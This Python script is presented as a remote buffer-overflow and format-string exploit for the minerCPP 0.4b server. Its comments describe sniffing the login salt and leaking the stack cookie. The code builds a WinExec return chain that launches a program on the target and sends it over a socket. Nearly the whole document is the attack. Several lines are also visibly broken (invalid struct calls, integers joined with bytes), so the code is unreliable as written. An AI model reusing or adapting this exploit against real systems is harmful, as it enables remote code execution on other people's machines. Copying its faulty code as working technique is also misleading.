#!/usr/bin/env python
#minerCPP 0.4b Remote BOF+Format String Attack Exploit
#Software Link: http://sourceforge.net/projects/minercpp/
#Author: l3D
#Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com
#Tested on Windows 7

#In order to make this exploit work you should sniff the salt first.
#It's sent by the software to www.minecraft.net
#You can find it in the POST data (salt=12345 for instance).
#I added a part that sniffs it automatically using pcapy. 
#Furthermore, in a real attack it can be simply brute
#forced (it's only rand()). I didn't add this part in
#order to prevent abusing.

#The EAX can be influenced and the stack too.
#However, there is a stack cookie that
#prevents us to jump into our overwritten RET.
#There are no SEH nor vtable overwritings.

#So what can we do?...
#I found a format string attack vulnerability
#which lets us calculate the master cookie
#and get the ESP of the current thread.
#Unfortunately, the BOF is in another
#thread, so the ESP we've got may not match
#the ESP we need, what makes this exploit unstable.

#Code execution worked to me 10 out of 50 times.

import socket
from time import sleep
import  hashlib, re, struct, os, sys
from payload import buf
import socket
import struct

def shell_attack(target_machine, target_port):

	host=target_machine
	port=target_port
	login=b'\x00\x07'
	esp=0x50
	kernel32 = struct.unpack(b'2L', 0x4ef88)
	winexec=struct.pack(b'L', kernel32+0x8e76d)
	exitprocess=struct.pack(b'L', kernel32+0x52aef)
	calc=struct.pack(b'L', esp+0x98)
	junk='A'*(64-len(buf))
	xored_esp=struct.pack('L', esp)
	ret=winexec #jump to WinExec @ kernel32.dll
	ret+=b'JUNK'
	ret+=b'\x10\x01\x01\x10' #readable address @ zlib1.dll
	ret+=exitprocess #jump to ExitProcess @ kernel32.dll
	ret+=calc #the place of the string in the stack
	ret+=b'\x01\xFF\xFF\xFF'
	ret+=b'JUNK'
	ret+=b'\xFF\xFF\xFF\xFF' #exit code -1
	ret+=b'calc' #a program to execute
     
	msg=b'\x0d\x7e'
	payload = login+esp+kernel32+junk+xored_esp+ret
	sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target_machine, target_port))
	sock.send(payload)
	sock.recv(100)
	
	



	sleep(2)

	##############################################################################################





	sock.recv(2048)

	sock.close()





